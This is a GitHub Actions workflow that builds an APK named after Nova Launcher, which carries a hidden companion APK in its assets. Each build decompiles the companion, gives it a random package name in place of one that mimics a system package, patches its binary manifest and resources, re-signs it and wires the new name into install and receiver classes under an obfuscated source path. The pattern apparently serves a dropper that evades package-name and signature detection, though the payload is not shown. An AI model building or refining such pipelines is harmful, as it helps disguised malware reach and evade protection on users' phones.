name: Build Nova Launcher APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    name: Build Release APK
    runs-on: ubuntu-latest

    env:
      OLD_PKG: com.android.pictach
      APK_ASSET: app/src/main/assets/companion.apk

    steps:

      # ── 1. Checkout ─────────────────────────────────────────────────────────
      - name: Checkout Repository
        uses: actions/checkout@v4

      # ── 2. Generate random package name ─────────────────────────────────────
      - name: Generate random companion package name
        id: pkg
        run: |
          random_segment() {
            cat /dev/urandom | tr -dc 'abcdefghijklmnopqrstuvwxyz' | head -c $((RANDOM % 3 + 6))
          }
          SEG1=$(random_segment)
          SEG2=$(random_segment)
          NEW_PKG="com.${SEG1}.${SEG2}"
          echo "NEW_PKG=${NEW_PKG}" >> $GITHUB_OUTPUT
          echo "✅ Generated package name: ${NEW_PKG}"

      # ── 3. Verify companion.apk exists ───────────────────────────────────────
      - name: Verify companion.apk exists
        run: |
          if [ ! -f "${{ env.APK_ASSET }}" ]; then
            echo "[X] companion.apk missing from assets!"
            exit 1
          fi
          echo "[OK] companion.apk found ($(du -h ${{ env.APK_ASSET }} | cut -f1))"

      # ── 4. Install tools ─────────────────────────────────────────────────────
      - name: Install tools
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y zipalign apksigner aapt

          APKTOOL_VER="2.9.3"
          wget -q "https://github.com/iBotPeaches/Apktool/releases/download/v${APKTOOL_VER}/apktool_${APKTOOL_VER}.jar" \
               -O /usr/local/bin/apktool.jar
          wget -q "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" \
               -O /usr/local/bin/apktool
          chmod +x /usr/local/bin/apktool
          apktool --version

      # ── 5. Extract companion APK metadata ────────────────────────────────────
      - name: Extract companion APK metadata
        id: meta
        run: |
          INFO=$(aapt dump badging "${{ env.APK_ASSET }}" 2>/dev/null | head -5)
          echo "$INFO"
          MIN_SDK=$(echo "$INFO" | grep -oP "(?<=minSdkVersion:')[0-9]+" || echo "28")
          TGT_SDK=$(echo "$INFO" | grep -oP "(?<=targetSdkVersion:')[0-9]+" || echo "33")
          VER_CODE=$(echo "$INFO" | grep -oP "(?<=versionCode=')[0-9]+" || echo "1")
          VER_NAME=$(echo "$INFO" | grep -oP "(?<=versionName=')[^']+" || echo "1.0")
          echo "min_sdk=$MIN_SDK"   >> $GITHUB_OUTPUT
          echo "tgt_sdk=$TGT_SDK"   >> $GITHUB_OUTPUT
          echo "ver_code=$VER_CODE" >> $GITHUB_OUTPUT
          echo "ver_name=$VER_NAME" >> $GITHUB_OUTPUT
          echo "✅ min=$MIN_SDK target=$TGT_SDK code=$VER_CODE name=$VER_NAME"

      # ── 6. Decompile companion APK (smali only) ──────────────────────────────
      - name: Decompile companion APK
        run: |
          apktool d "${{ env.APK_ASSET }}" \
            -o companion_decompiled \
            --no-res \
            --keep-broken-res \
            2>&1 | tee decompile.log
          echo "✅ Decompile done"

      # ── 7. Rename smali class paths + string literals ────────────────────────
      - name: Rename smali
        run: |
          OLD="${{ env.OLD_PKG }}"
          NEW="${{ steps.pkg.outputs.NEW_PKG }}"
          OLD_PATH="${OLD//.//}"
          NEW_PATH="${NEW//.//}"

          find companion_decompiled/smali -name "*.smali" \
            -exec sed -i "s|${OLD_PATH}|${NEW_PATH}|g" {} +

          find companion_decompiled/smali -name "*.smali" \
            -exec sed -i "s|${OLD}|${NEW}|g" {} +

          if [ -d "companion_decompiled/smali/com/android/pictach" ]; then
            mkdir -p "companion_decompiled/smali/$(echo $NEW | tr '.' '/' | sed 's|/[^/]*$||')"
            mv "companion_decompiled/smali/com/android/pictach" \
               "companion_decompiled/smali/${NEW_PATH}"
          fi

          OLD_COUNT=$(grep -r "${OLD_PATH}" companion_decompiled/smali/ | wc -l)
          NEW_COUNT=$(grep -r "${NEW_PATH}" companion_decompiled/smali/ | wc -l)
          echo "Old refs remaining: ${OLD_COUNT}"
          echo "New refs present:   ${NEW_COUNT}"
          if [ "$OLD_COUNT" -gt 0 ]; then
            echo "::error::Old package path still present in smali after rename."
            exit 1
          fi
          echo "✅ Smali renamed"

      # ── 8. Restore apktool.yml ───────────────────────────────────────────────
      - name: Restore apktool.yml
        run: |
          cat > companion_decompiled/apktool.yml << YML
          version: 2.9.3
          apkFileName: companion.apk
          isFrameworkApk: false
          usesFramework:
            ids:
            - 1
            tag: null
          sdkInfo:
            minSdkVersion: '${{ steps.meta.outputs.min_sdk }}'
            targetSdkVersion: '${{ steps.meta.outputs.tgt_sdk }}'
          packageInfo:
            forcedPackageId: '127'
            renameManifestPackage: null
          versionInfo:
            versionCode: '${{ steps.meta.outputs.ver_code }}'
            versionName: '${{ steps.meta.outputs.ver_name }}'
          resourcesAreCompressed: false
          sharedLibrary: false
          sparseResources: false
          doNotCompress:
          - resources.arsc
          YML
          echo "✅ apktool.yml restored"

      # ── 9. Rebuild classes.dex ───────────────────────────────────────────────
      - name: Rebuild classes.dex
        run: |
          apktool b companion_decompiled \
            -o smali_rebuilt.apk \
            --no-res \
            2>&1 | tee repackage.log

          if [ ! -f smali_rebuilt.apk ] || [ ! -s smali_rebuilt.apk ]; then
            echo "::error::apktool repackage failed or produced empty file."
            exit 1
          fi

          unzip -p smali_rebuilt.apk classes.dex > new_classes.dex
          if [ ! -s new_classes.dex ]; then
            echo "::error::classes.dex extraction failed or empty."
            exit 1
          fi
          ls -lh new_classes.dex
          echo "✅ classes.dex rebuilt"

      # ── 10. Patch manifest + resources.arsc + assemble renamed companion APK ─
      - name: Patch manifest and assemble companion APK
        run: |
          python3 << PYEOF
          import zipfile, struct, os, sys

          APK_IN   = "${{ env.APK_ASSET }}"
          DEX_FILE = "new_classes.dex"
          APK_OUT  = "companion_renamed_unsigned.apk"
          OLD      = b"${{ env.OLD_PKG }}"
          NEW      = b"${{ steps.pkg.outputs.NEW_PKG }}"
          DELTA    = len(NEW) - len(OLD)

          with open(DEX_FILE, "rb") as f:
              new_dex = f.read()
          print(f"New classes.dex: {len(new_dex)} bytes")

          # ── Binary-patch AndroidManifest.xml ──────────────────────────────
          with zipfile.ZipFile(APK_IN, "r") as z:
              manifest_raw = z.read("AndroidManifest.xml")

          SP           = 8
          sp_size      = struct.unpack_from("<I", manifest_raw, SP+4)[0]
          str_count    = struct.unpack_from("<I", manifest_raw, SP+8)[0]
          strs_start   = struct.unpack_from("<I", manifest_raw, SP+20)[0]
          str_data_abs = SP + strs_start
          offsets_abs  = SP + 28
          sp_end       = SP + sp_size
          xml_tree     = manifest_raw[sp_end:]

          entries = []
          for i in range(str_count):
              off = struct.unpack_from("<I", manifest_raw, offsets_abs + i*4)[0]
              pos = str_data_abs + off
              cc  = manifest_raw[pos]
              bc  = manifest_raw[pos+1]
              ch  = manifest_raw[pos+2:pos+2+bc]
              assert manifest_raw[pos+2+bc] == 0, f"String {i} missing null terminator"
              entries.append((cc, bc, ch))

          new_str_data = bytearray()
          new_offsets  = []
          replaced     = 0
          for (cc, bc, ch) in entries:
              new_offsets.append(len(new_str_data))
              if OLD in ch:
                  new_ch = ch.replace(OLD, NEW)
                  new_str_data.extend([cc + DELTA, bc + DELTA])
                  new_str_data.extend(new_ch)
                  new_str_data.append(0)
                  replaced += 1
              else:
                  new_str_data.extend([cc, bc])
                  new_str_data.extend(ch)
                  new_str_data.append(0)

          if replaced == 0:
              print("ERROR: No strings replaced in manifest — OLD package not found")
              sys.exit(1)

          new_sp_size = 28 + str_count*4 + len(new_str_data)
          result = bytearray()
          result.extend(manifest_raw[0:8])
          result.extend(manifest_raw[SP:SP+28])
          for off in new_offsets:
              result.extend(struct.pack("<I", off))
          result.extend(new_str_data)
          result.extend(xml_tree)
          struct.pack_into("<I", result, 4,    len(result))
          struct.pack_into("<I", result, SP+4, new_sp_size)
          new_manifest = bytes(result)
          print(f"Manifest: {len(manifest_raw)}→{len(new_manifest)} bytes, {replaced} strings replaced")

          # ── Binary-patch resources.arsc ───────────────────────────────────
          with zipfile.ZipFile(APK_IN, "r") as z:
              arsc_raw = bytearray(z.read("resources.arsc"))

          OLD_UTF16 = OLD.decode("ascii").encode("utf-16-le") + b"\x00\x00"
          NEW_UTF16 = NEW.decode("ascii").encode("utf-16-le") + b"\x00\x00"
          assert len(NEW_UTF16) <= 256, "New package name too long for resources.arsc name field"

          arsc_patched = 0
          pos = 0
          while pos < len(arsc_raw) - 8:
              chunk_type = struct.unpack_from("<H", arsc_raw, pos)[0]
              hdr_size   = struct.unpack_from("<H", arsc_raw, pos + 2)[0]
              chunk_size = struct.unpack_from("<I", arsc_raw, pos + 4)[0]
              if chunk_type == 0x0200 and hdr_size == 288 and 1000 < chunk_size < len(arsc_raw):
                  name_off = pos + 12
                  name_field = arsc_raw[name_off:name_off + 256]
                  if OLD_UTF16 in name_field:
                      new_name_field = bytearray(256)
                      new_name_field[:len(NEW_UTF16)] = NEW_UTF16
                      arsc_raw[name_off:name_off + 256] = new_name_field
                      arsc_patched += 1
                      print(f"  ✓ resources.arsc patched at offset {hex(pos)}")
              pos += 1

          if arsc_patched == 0:
              print("ERROR: Old package name not found in resources.arsc")
              sys.exit(1)

          new_arsc = bytes(arsc_raw)
          print(f"resources.arsc: {arsc_patched} chunk(s) patched")

          # ── Assemble final companion APK ──────────────────────────────────
          tmp = APK_OUT + ".tmp"
          with zipfile.ZipFile(APK_IN, "r") as zin:
              with zipfile.ZipFile(tmp, "w", allowZip64=False) as zout:
                  for item in zin.infolist():
                      if item.filename == "AndroidManifest.xml":
                          zout.writestr(item, new_manifest)
                          print("  ✓ AndroidManifest.xml replaced")
                      elif item.filename == "classes.dex":
                          zout.writestr(item, new_dex)
                          print("  ✓ classes.dex replaced")
                      elif item.filename == "resources.arsc":
                          zout.writestr(item, new_arsc)
                          print("  ✓ resources.arsc replaced")
                      else:
                          zout.writestr(item, zin.read(item.filename))

          os.replace(tmp, APK_OUT)
          print(f"Output: {APK_OUT} ({os.path.getsize(APK_OUT)} bytes)")
          PYEOF

          if [ ! -f companion_renamed_unsigned.apk ] || [ ! -s companion_renamed_unsigned.apk ]; then
            echo "::error::Companion APK assembly failed."
            exit 1
          fi
          echo "✅ Companion APK assembled"

      # ── 11. Generate debug keystore for companion signing ────────────────────
      - name: Generate debug keystore
        run: |
          keytool -genkeypair \
            -keystore debug.keystore \
            -alias androiddebugkey \
            -keyalg RSA -keysize 2048 -validity 10000 \
            -storepass android -keypass android \
            -dname "CN=Android Debug,O=Android,C=US" \
            -noprompt
          echo "✅ Keystore ready"

      # ── 12. Zipalign companion APK ───────────────────────────────────────────
      - name: Zipalign companion APK
        run: |
          zipalign -v 4 companion_renamed_unsigned.apk companion_renamed_aligned.apk
          if [ ! -s companion_renamed_aligned.apk ]; then
            echo "::error::Zipalign failed."
            exit 1
          fi
          echo "✅ Zipalign done"

      # ── 13. Sign companion APK ───────────────────────────────────────────────
      - name: Sign companion APK
        run: |
          cp companion_renamed_aligned.apk companion_final.apk
          apksigner sign \
            --ks debug.keystore \
            --ks-key-alias androiddebugkey \
            --ks-pass pass:android \
            --key-pass pass:android \
            companion_final.apk
          if [ ! -s companion_final.apk ]; then
            echo "::error::Signing produced empty APK."
            exit 1
          fi
          echo "✅ Companion APK signed"

      # ── 14. Replace companion.apk in assets with renamed version ────────────
      - name: Replace companion.apk in assets
        run: |
          cp companion_final.apk ${{ env.APK_ASSET }}
          echo "✅ assets/companion.apk replaced with renamed version"
          ls -lh ${{ env.APK_ASSET }}

      # ── 15. Inject random package name into Nova Launcher Kotlin source ──────
      - name: Inject companion package name into Kotlin source
        run: |
          NEW="${{ steps.pkg.outputs.NEW_PKG }}"

          # InstallActivity.kt — MARKET_URI + setAppPackageName
          sed -i "s|market://details?id=com\.pictach\.app|market://details?id=${NEW}|g" \
            app/src/main/java/com/cristal/bristral/tristal/mistral/InstallActivity.kt
          sed -i "s|\"com\.pictach\.app\"|\"${NEW}\"|g" \
            app/src/main/java/com/cristal/bristral/tristal/mistral/InstallActivity.kt

          # SecondActivity.kt — isCompanionInstalled + launchCompanionApp
          sed -i "s|\"com\.pictach\.app\"|\"${NEW}\"|g" \
            app/src/main/java/com/cristal/bristral/tristal/mistral/SecondActivity.kt

          # InstallReceiver.kt — COMPANION_PKG constant
          sed -i "s|\"com\.pictach\.app\"|\"${NEW}\"|g" \
            app/src/main/java/com/cristal/bristral/tristal/mistral/InstallReceiver.kt

          echo "✅ Kotlin source injected with: ${NEW}"

          # Verify — no old package name remains
          REMAINING=$(grep -r "com.pictach.app" \
            app/src/main/java/com/cristal/bristral/tristal/mistral/ | wc -l)
          if [ "$REMAINING" -gt 0 ]; then
            echo "::error::Old package name still present in Kotlin source."
            exit 1
          fi
          echo "✅ Verified: no old package name remaining"

      # ── 16. Set up JDK 17 ───────────────────────────────────────────────────
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      # ── 17. Setup Android SDK ────────────────────────────────────────────────
      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      # ── 18. Cache Gradle wrapper ─────────────────────────────────────────────
      - name: Cache Gradle wrapper
        uses: actions/cache@v4
        with:
          path: gradle/wrapper/gradle-wrapper.jar
          key: gradle-wrapper-${{ runner.os }}

      # ── 19. Grant gradlew permission ─────────────────────────────────────────
      - name: Grant gradlew permission
        run: chmod +x gradlew

      # ── 20. Build Nova Launcher release APK ──────────────────────────────────
      - name: Build Release APK
        run: ./gradlew assembleRelease --stacktrace --no-daemon

      # ── 21. Show APK info ────────────────────────────────────────────────────
      - name: Show APK info
        run: |
          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
          echo "APK: $APK"
          echo "Size: $(du -h $APK | cut -f1)"
          echo "Companion package name: ${{ steps.pkg.outputs.NEW_PKG }}"
          echo "DEX files:"
          unzip -l $APK | grep "\.dex"

      # ── 22. Upload Nova Launcher release APK ─────────────────────────────────
      - name: Upload Release APK
        uses: actions/upload-artifact@v4
        with:
          name: nova-launcher-release
          path: app/build/outputs/apk/release/app-release.apk
          retention-days: 1
          overwrite: true

      # ── 23. Collect error logs on failure ────────────────────────────────────
      - name: Collect error logs
        if: failure()
        run: |
          mkdir -p error_logs
          for f in decompile.log repackage.log; do
            [ -f "$f" ] && cp "$f" error_logs/
          done
          {
            echo "=== COMPANION PACKAGE ==="
            echo "${{ steps.pkg.outputs.NEW_PKG }}"
            echo "=== FILE SIZES ==="
            ls -lh companion_renamed_unsigned.apk companion_renamed_aligned.apk companion_final.apk 2>&1 || true
            echo "=== JAVA ===" && java -version 2>&1 || true
            echo "=== APKTOOL ===" && apktool --version 2>&1 || true
          } >> error_logs/env_info.txt
          zip -r error_logs.zip error_logs/

      # ── 24. Upload error logs ────────────────────────────────────────────────
      - name: Upload error logs
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: error-logs
          path: error_logs.zip
          retention-days: 7
